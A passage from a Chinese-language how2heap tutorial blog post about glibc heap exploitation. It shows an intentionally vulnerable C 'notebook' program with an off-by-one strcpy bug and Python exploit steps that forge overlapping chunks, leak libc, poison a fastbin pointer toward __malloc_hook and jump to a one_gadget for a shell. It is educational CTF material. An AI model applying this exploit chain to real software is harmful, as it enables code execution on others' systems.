+</span></span><span style=display:flex><span><span style=color:#75715e>#define DELETE 1
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#define PRINT 2
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>create</span>();
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>process</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>ptrs[<span style=color:#ae81ff>10</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/**
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * main-loop: print menu, read choice, call create/delete/exit
+</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdout, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> choice;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;1. create</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>2. delete</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>3. print</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>4. exit&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;&gt; &#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%u&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span>(choice) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>create</span>(); <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>process</span>(DELETE); <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>process</span>(PRINT); <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>); <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;invalid choice&#34;</span>); <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/**
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * creates a new chunk.
+</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>create</span>() {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> i, size;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> idx <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>1024</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>10</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (ptrs[i] <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>      idx <span style=color:#f92672>=</span> i;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (idx <span style=color:#f92672>==</span> <span style=color:#ae81ff>10</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;no free slots</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>using slot %u</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, idx);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;size: &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%u&#34;</span>, <span style=color:#f92672>&amp;</span>size);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (size <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1023</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;maximum size (1023 bytes) exceeded</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;data: &#34;</span>);
+</span></span><span style=display:flex><span>  size <span style=color:#f92672>=</span> <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, buf, size);
+</span></span><span style=display:flex><span>  buf[size] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00</span>;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  ptrs[idx] <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)<span style=color:#a6e22e>malloc</span>(size);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>strcpy</span>(ptrs[idx], buf);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;successfully created chunk</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/**
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * deletes or prints an existing chunk.
+</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>process</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> action) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> idx;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;idx: &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%u&#34;</span>, <span style=color:#f92672>&amp;</span>idx);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>10</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;invalid index</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (ptrs[idx] <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;chunk not existing</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (action <span style=color:#f92672>==</span> DELETE) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>free</span>(ptrs[idx]);
+</span></span><span style=display:flex><span>    ptrs[idx] <span style=color:#f92672>=</span> NULL;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;successfully deleted chunk</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (action <span style=color:#f92672>==</span> PRINT) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>data: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, ptrs[idx]);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>程序类似CTF中的notebook程序，运行输出如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>xerus@xerus:~``/pwn/heap``$ .``/heap
+</span></span><span style=display:flex><span>1. create
+</span></span><span style=display:flex><span>2. delete
+</span></span><span style=display:flex><span>3. print
+</span></span><span style=display:flex><span>4. exit
+</span></span><span style=display:flex><span>&gt; 
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&gt; 1
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>using slot 0
+</span></span><span style=display:flex><span>size: 40
+</span></span><span style=display:flex><span>data: AAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style=display:flex><span>successfully created chunk
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&gt; 3
+</span></span><span style=display:flex><span>idx: 0
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>data: AAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&gt; 3
+</span></span><span style=display:flex><span>idx: 0
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>data: AAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span></code></pre></div><p>通过分析程序的代码我们可以知道在 create 时会有off by one：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>printf(&#34;data: &#34;);
+</span></span><span style=display:flex><span>size = read(0, buf, size);
+</span></span><span style=display:flex><span>buf[size] = 0x00; 
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>ptrs[idx] = (char*)malloc(size);
+</span></span><span style=display:flex><span>strcpy(ptrs[idx], buf); // off by one
+</span></span></code></pre></div><p>漏洞源于strcpy操作，由于strcpy会复制字符串结尾的\0，此时我们可以溢出到其下一个chunk的size字段（ptmalloc2使用了边界标记法，malloc chunk的prev_size字段其实是在前一个个chunk的尾部保存的，所以我们可以修改size字段）。</p><p>调用两次malloc来验证边界标记法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>...
+</span></span><span style=display:flex><span>  char *ptr = malloc(0x88);
+</span></span><span style=display:flex><span>  char *ptr2 = malloc(0x28);
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p><img src=/imgs/img-lazy-loading.gif data-src=heapbasic-2.png alt=img></p><p>将chunk1用字符A填满：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>...
+</span></span><span style=display:flex><span>  char *ptr = malloc(0x88);
+</span></span><span style=display:flex><span>  char *ptr2 = malloc(0x28);
+</span></span><span style=display:flex><span>  for (int i = 0; i &lt; 0x88; i++) ptr[i] = &#39;A&#39;;
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p><img src=/imgs/img-lazy-loading.gif data-src=heapbasic-3.png alt=img></p><p>当chunk1被free时，chunk1的FD和BK字段被设置，chunk2的prev_size被设置，prev_inuse位被置0：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>...
+</span></span><span style=display:flex><span>  char *ptr = malloc(0x88);
+</span></span><span style=display:flex><span>  char *ptr2 = malloc(0x28);
+</span></span><span style=display:flex><span>  for (int i = 0; i &lt; 0x88; i++) ptr[i] = &#39;A&#39;;
+</span></span><span style=display:flex><span>  free(ptr);
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p><img src=/imgs/img-lazy-loading.gif data-src=heapbasic-4.png alt=img></p><p>此时<em>smallbin</em>s 如下：</p><p><img src=/imgs/img-lazy-loading.gif data-src=mainarena_01.png alt=img></p><p>如果我们free掉一个chunk，那么这个chunk会被插入到双向链表的头结点，如下：</p><p><img src=/imgs/img-lazy-loading.gif data-src=mainarena_02a.png alt=img></p><p>即：</p><p><img src=/imgs/img-lazy-loading.gif data-src=mainarena_05.png alt=img></p><p>fastbins则有所不一样，插入同样是头插法，但是malloc是取最前面的节点：</p><p><img src=/imgs/img-lazy-loading.gif data-src=mainarena_10.png alt=img></p><p>为了实现getshell，我们需要泄露libc的地址，而bins的头或尾节点的指针会指向main_arena（fastbins除外）。通过伪造堆块我们可以实现这个目的。</p><p>为了伪造重叠的chunks，我们需要先创建一些堆块：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>create(0xf8, &#39;A&#39;*0xf8) # chunk_AAA, idx = 0
+</span></span><span style=display:flex><span>create(0x68, &#39;B&#39;*0x68) # chunk_BBB, idx = 1
+</span></span><span style=display:flex><span>create(0xf8, &#39;C&#39;*0xf8) # chunk_CCC, idx = 2
+</span></span><span style=display:flex><span>create(0x10, &#39;D&#39;*0x10) # chunk_DDD, idx = 3
+</span></span></code></pre></div><p>内存分布如图：</p><p><img src=/imgs/img-lazy-loading.gif data-src=dev-3.png alt=img></p><ul><li><code>**chunk_AAA**</code> 是free的堆块，用作合法的空闲堆块</li><li><code>**chunk_BBB**</code> 是存在off by one漏洞 的堆块</li><li><code>**chunk_CCC**</code>的prev_inuse位会被清除，prev_size被设置为<strong>chunk_AAA</strong>+<strong>chunk_BBB</strong>的size</li><li><code>**chunk_DDD**</code> 是fastbin chunk，唯一的作用是防止free chunk和top chunk合并</li></ul><p>首先free chunk_AAA：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># chunk_AAA will be a valid free chunk (containing libc-addresses in FD/BK)
+</span></span><span style=display:flex><span>delete(0)
+</span></span></code></pre></div><p>然后在chunk_BBB上利用off by one修改chunk_CCC的prev_inuse位，由于chunk_BBB的大小属于fastbin，因此不会被和其他chunk合并</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># leverage off-by-one vuln in chunk_BBB:
+</span></span><span style=display:flex><span># overwrite prev_inuse bit of following chunk (chunk_CCC)
+</span></span><span style=display:flex><span>delete(1)
+</span></span><span style=display:flex><span>create(0x68, &#39;B&#39;*0x68) # chunk_BBB, new idx = 0
+</span></span></code></pre></div><p>下面修改prev size以及清除prev_inuse位，由于strcpy的限制，我们需要多次调用递减申请的size达到目的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># set prev_size of following chunk (chunk_CCC) to 0x170
+</span></span><span style=display:flex><span>for i in range(0x66, 0x5f, -1):
+</span></span><span style=display:flex><span>  delete(0)
+</span></span><span style=display:flex><span>  create(i+2, &#39;B&#39;*i + &#39;\x70\x01&#39;) # chunk_BBB, new_idx = 0
+</span></span></code></pre></div><p><img src=/imgs/img-lazy-loading.gif data-src=dev-4.png alt=img></p><p>现在free chunk_CCC，它会被和前面的chunk合并，新的大小为0x170 bytes</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># now delete chunk_CCC to trigger consolidation with the fakechunk (0x170)
+</span></span><span style=display:flex><span># after this we have got a big free chunk (0x270) overlapping with chunk_BBB
+</span></span><span style=display:flex><span>delete(2)
+</span></span></code></pre></div><p><img src=/imgs/img-lazy-loading.gif data-src=dev-5.png alt=img></p><p>然后申请一个大小与chunk_AAA相同的chunk</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># create a new chunk (chunk_EEE) within the big free chunk to push
+</span></span><span style=display:flex><span># the libc-addresses (fd/bk) down to chunk_BBB
+</span></span><span style=display:flex><span>create(0xf6, &#39;E&#39;*0xf6) # chunk_EEE, new_idx = 1
+</span></span></code></pre></div><p><img src=/imgs/img-lazy-loading.gif data-src=dev-6.png alt=img></p><p>打印chunk_BBB的内容即可泄露libc地址。通过vmmap查看libc的基址，可以得到libc_offset。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># the content of chunk_BBB now contains fd/bk (libc-addresses)
+</span></span><span style=display:flex><span># just print the chunk (idx = 0)
+</span></span><span style=display:flex><span>libc_offset    = 0x3c4b78
+</span></span><span style=display:flex><span>libc_leak = printData(0)
+</span></span><span style=display:flex><span>libc_leak = unpack(libc_leak + (8-len(libc_leak))*&#39;\x00&#39;, 64)
+</span></span><span style=display:flex><span>libc_base = libc_leak - libc_offset
+</span></span><span style=display:flex><span>log.info(&#39;libc_base: &#39; + hex(libc_base))
+</span></span></code></pre></div><p>接下来就是最重要的环节了：控制RIP</p><p>这里我们通过将<code>__malloc_hook</code>指向gadget，这样在调用<code>malloc</code>时就会调用<code>__malloc_hook</code>，进而控制程序流。</p><p>那么如何修改<code>__malloc_hook</code>呢？我们已经有了两个重叠的chunk，这样便可以修改其中一个chunk的FD指针，将其指向<code>__malloc_hook</code>前面的区域。</p><p>首先恢复<code>chunk_BBB</code>的<code>size+flags</code>域，然后free掉<code>chunk_BBB</code>和<code>chunk_EEE</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># restore the size field (0x70) of chunk_BBB
+</span></span><span style=display:flex><span># delete(1)
+</span></span><span style=display:flex><span># create(0xf9,&#39;E&#39;*0xf8+&#39;\x70&#39;)
+</span></span><span style=display:flex><span>for i in range(0xfd, 0xf7, -1):
+</span></span><span style=display:flex><span>  delete(1)
+</span></span><span style=display:flex><span>  create(i+1, &#39;E&#39;*i + &#39;\x70&#39;) # chunk_EEE, new_idx = 1
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span># free chunk_BBB: the address of the chunk is added to the fastbin-list
+</span></span><span style=display:flex><span>delete(0)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span># free chunk_EEE
+</span></span><span style=display:flex><span>delete(1)
+</span></span></code></pre></div><p><code>chunk_BBB</code>会被加入fastbin</p><p><img src=/imgs/img-lazy-loading.gif data-src=mainarena_14.png alt=Alt></p><p>然后可以通过申请一个大的堆块来修改<code>chunk_BBB</code>的FD指针</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># create another new chunk (chunk_FFF) within the big free chunk which
+</span></span><span style=display:flex><span># will set the fd of the free&#39;d fastbin chunk_BBB to the value of foo
+</span></span><span style=display:flex><span>foo = 0xdeadbeef
+</span></span><span style=display:flex><span>create(0x108, &#39;F&#39;*0x100 + p64(foo)) # new_idx = 0
+</span></span></code></pre></div><p>此时FD指针已被修改为我们伪造的地址：</p><p><img src=/imgs/img-lazy-loading.gif data-src=dev-8.png alt=Alt></p><p>此时的fastbin如下:</p><p><img src=/imgs/img-lazy-loading.gif data-src=mainarena_15.png alt=Alt></p><p>由于<code>malloc</code>会检查fastbin是否合法，因为<code>chunk_BBB</code>的大小是0x70字节，那么接下来的chunk大小也需要是0x70字节。</p><p>而<code>__malloc_hook</code>前面的区域恰好满足这个要求：</p><p><img src=/imgs/img-lazy-loading.gif data-src=dev-10.png alt=Alt></p><p>此时将接下来的chunk的FD修改为<code>__malloc_hook</code>的地址即可。这样在<code>malloc</code>时便会触发<code>_malloc_hook</code>，进而实现代码执行。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># create another new chunk (chunk_FFF) within the big free chunk which
+</span></span><span style=display:flex><span># will set the fd of the free&#39;d fastbin chunk_BBB to the address of hook
+</span></span><span style=display:flex><span>hook_offset = 0x3c4aed
+</span></span><span style=display:flex><span>hook        = libc_base + hook_offset
+</span></span><span style=display:flex><span>create(0x108, &#39;F&#39;*0x100 + p64(hook)) # new_idx = 0
+</span></span></code></pre></div><p>通过one_gadget查找gadget，这里和文章中的偏移不一样是因为glibc的小版本不一样：</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230424215608532.png alt=image-20230424215608532></p><p>最终得到可用的gadget地址：<code>0xf03a4</code></p><p>至此，已经完成了整个漏洞利用过程。</p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230424220526787.png alt=image-20230424220526787></p><h2 id=house_of_lore>house_of_lore
+<a class=header-anchor href=#house_of_lore></a></h2><p><code>Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.</code></p><p>通过伪造堆块实现返回指定位置的堆块，进而实现任意地址写。</p><p>我们需要修改三个堆块的内容，其中一个是真实的堆块（victim），另外两个是栈上伪造的。</p><p>通过伪造fake small bin list，将伪造的两个堆块加入small bin，然后</p></div><footer class=post-footer><div class=post-tags><a href=/tags/pwn>PWN</a>
+<a href=/tags/how2heap>how2heap</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
+how2heap全系列（持续更新）</li><li class=post-copyright-author><strong>本文作者：</strong>
+Zero</li><li class=post-copyright-link><strong>本文链接：</strong>
+<a id=post-cr-link href=https://izeroo.cn/post/how2heap.html title=how2heap全系列（持续更新）>https://izeroo.cn/post/how2heap.html</a></li><li class=post-copyright-license><strong>版权声明：</strong>
+本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/hws-2023-pwn-wp.html rel=next title="HWS 2023 第七期夏令营（硬件安全营）wp"><i class="fa fa-chevron-left"></i> HWS 2023 第七期夏令营（硬件安全营）wp</a></div><div class="post-nav-prev post-nav-item"><a href=/post/csapp-malloc-lab.html rel=prev title="CSAPP Malloc Lab">CSAPP Malloc Lab
+<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div id=comments class=post-comments><div class=comment-head><div class=comment-headline><i class="fas fa-comments fa-fw"></i>
+<span>评论交流</span></div></div><div class=comment-wrap><div><div class=comment-loading><i class="fa fa-sync fa-spin"></i></div><div class=waline-container></div></div></div></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
+<span itemprop=copyrightYear>2021 - 2023</span>
+<span class=with-love><i class="fa fa-heart"></i></span>
+<span class=author itemprop=copyrightHolder>Zero</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.111.3 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.5.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备2021002440号-1</a>
+<img src=/imgs/gongan.png alt=鄂公网安备>
+<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42112702000080" target=_blank>鄂公网安备 42112702000080 号</a></div></div></footer><script type=text/javascript src=https://unpkg.com/animejs@3.2.1/lib/anime.min.js defer></script>
+<script type=text/javascript src=https://unpkg.com/viewerjs@1.11.0/dist/viewer.min.js defer></script>
+<script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":false,"save":"manual"},"copybtn":true,"darkmode":true,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://izeroo.cn","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"unpkg","router":"https://unpkg.com"},"version":"4.5.3","waline":{"cfg":{"emoji":false,"imguploader":false,"pageview":"#waline-pageview-count","placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":"https://waline.izeroo.cn","sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"waline","file":"dist/waline.css","name":"@waline/client","version":"2.13.0"},"js":{"alias":"waline","file":"dist/waline.js","name":"@waline/client","version":"2.13.0"}}}</script><script type=text/javascript src=/js/main.min.172ae7dfd181813113a42cd33e0d01ee7d239870a49495e95982cc76539f01bb.js defer></script></body></html>
